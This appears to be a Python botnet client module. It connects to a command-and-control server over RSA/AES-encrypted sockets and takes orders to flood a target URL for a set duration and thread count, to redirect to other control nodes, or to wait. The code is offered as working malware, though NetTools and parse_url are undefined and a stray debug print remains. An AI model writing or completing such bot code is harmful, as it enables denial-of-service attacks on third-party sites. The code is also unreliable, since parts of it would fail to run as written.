import socket
import logging
import time
import json
from .crypto import Crypto
from .logger import getLogger

# Client Class
class Client:
    def __init__(self, server_host='127.0.0.1', server_port=547, debug=True):
        self.server_host = server_host
        self.server_port = server_port
        self.crypto = Crypto()
        self.private_key, self.public_key = self.crypto.generate_rsa_keys()
        self.sock = None
        self.redirects = 0
        self.max_redirects = 5
        self.running = True

        # Setup logging
        self.logger = getLogger("Client", debug)

    # Connect to server
    def connect(self):
        while self.running and self.redirects < self.max_redirects:
            try:
                # Create and connect socket
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_host, self.server_port))
                self.logger.info(f"Connected to server ({self.server_host}:{self.server_port})")

                # Receive server public key
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    raise ConnectionError("Failed to receive server public key length")
                server_pubkey_len = int.from_bytes(length_bytes, 'big')
                server_pubkey_pem = self._recv_n_bytes(server_pubkey_len)
                if not server_pubkey_pem:
                    raise ConnectionError("Failed to receive server public key")

                self.server_public_key = self.crypto.load_public_key(server_pubkey_pem)
                self.logger.info("Received server public key")

                # Send own public key to server
                pubkey_pem = self.crypto.serialize_public_key(self.public_key)
                self.sock.send(len(pubkey_pem).to_bytes(2, 'big') + pubkey_pem)
                self.logger.info(f"Sent public key to server ({self.server_host}:{self.server_port})")

                # Send authentication message
                auth_message = {"role": "client"}  # Indica che non è C2
                auth_message_bytes = json.dumps(auth_message).encode()
                self.sock.send(len(auth_message_bytes).to_bytes(2, 'big') + auth_message_bytes)
                self.logger.info("Sent authentication message to server")

                # Receive authentication confirmation
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    raise ConnectionError("Failed to receive auth confirmation length")
                auth_len = int.from_bytes(length_bytes, 'big')
                auth_confirmation = self._recv_n_bytes(auth_len)
                if not auth_confirmation:
                    raise ConnectionError("Failed to receive auth confirmation")
                auth_data = json.loads(auth_confirmation.decode())
                self.logger.info(f"Received auth confirmation: {auth_data}")
                if auth_data.get("status") != "success":
                    raise ConnectionError(f"Authentication failed: {auth_data.get('message')}")

                # Start listening for messages from server
                self._listen_server()

            except (ConnectionRefusedError, socket.timeout, ConnectionError, OSError) as e:
                self.logger.warning(f"Connection failed: {e}. Retrying in 5 seconds...")
                time.sleep(5)
            except json.JSONDecodeError as e:
                self.logger.error(f"JSON decode error: {e}")
                self.close()
                break
            except Exception as e:
                self.logger.error(f"Unexpected error: {e}")
                self.close()
                break
            finally:
                if self.sock:
                    try:
                        self.sock.close()
                    except Exception as e:
                        self.logger.debug(f"Error closing socket: {e}")
                    self.sock = None

    # Listen for server messages
    def _listen_server(self):
        try:
            while self.running:
                # Receive encrypted session key
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    self.logger.info("Server closed connection")
                    break
                encrypted_session_key_len = int.from_bytes(length_bytes, 'big')
                encrypted_session_key = self._recv_n_bytes(encrypted_session_key_len)
                if not encrypted_session_key:
                    self.logger.warning("Failed to receive session key")
                    break

                # Receive encrypted message
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    self.logger.warning("Failed to receive message length")
                    break
                encrypted_msg_len = int.from_bytes(length_bytes, 'big')
                encrypted_msg = self._recv_n_bytes(encrypted_msg_len)
                if not encrypted_msg:
                    self.logger.warning("Failed to receive message")
                    break

                # Decrypt message
                session_key = self.crypto.rsa_decrypt(self.private_key, encrypted_session_key)
                message = self.crypto.aes_decrypt(session_key, encrypted_msg).decode()
                self.logger.info(f"Received message: {message}")

                # Send ACK
                encrypted_ack = self.crypto.rsa_encrypt(self.server_public_key, b"ACK")
                self.sock.send(len(encrypted_ack).to_bytes(2, 'big') + encrypted_ack)
                self.logger.info(f"Sent ACK for message: {message}")

                # Process action
                try:
                    msg_json = json.loads(message)
                    action = msg_json.get("action")
                    self.logger.info(f"Processing action: {action}")


                    if action == "flood":
                        NetTools().run_attack(
                            parse_url(msg_json["data"]["url"]),
                            int(msg_json["data"]["duration"]),
                            msg_json["data"]["method"],
                            int(msg_json["data"]["threads"])
                    )

                    if action == "redirect":
                        current_node = f"{self.server_host}:{self.server_port}"
                        new_host = msg_json["data"]["host"]
                        new_port = msg_json["data"]["port"]
                        new_node = f"{new_host}:{new_port}"
                        if new_node != current_node:
                            self.server_host = new_host
                            self.server_port = new_port
                            self.redirects += 1
                            self.logger.info(f"Redirecting to {new_node}")
                            self.sock.close()
                            self.connect()  # Reconnect to new server
                        else:
                            self.logger.warning("Redirect to same node; closing")
                            self.close()

                    elif action == "wait":
                        wait_s = msg_json["data"]["s"]
                        self.logger.info(f"Waiting for {wait_s} seconds")
                        self.sock.close()
                        time.sleep(wait_s)
                        self.connect()  # Reconnect after wait

                    elif action in ["ping", "status", "ack"]:
                        self.logger.debug(f"Ignoring action: {action}")

                    else:
                        self.logger.warning(f"Unknown action: {action}")

                except KeyError as e:
                    self.logger.error(f"Missing key in message data: {e}")
                except json.JSONDecodeError as e:
                    self.logger.error(f"Invalid JSON in message: {e}")

        except Exception as e:
            self.logger.error(f"Error in listening loop: {e}")

        finally:
            if self.sock:
                self.sock.close()
                self.sock = None
            self.logger.info("Connection closed")

    # Helper: Receive exact number of bytes
    def _recv_n_bytes(self, n):
        data = b''
        while len(data) < n:
            try:
                chunk = self.sock.recv(n - len(data))
                if not chunk:
                    return None
            except socket.timeout:
                self.logger.warning("Socket recv timeout")
                return None
            data += chunk
            print(data)
        return data

    # Close client
    def close(self):
        self.running = False
        if self.sock:
            self.sock.close()
            self.sock = None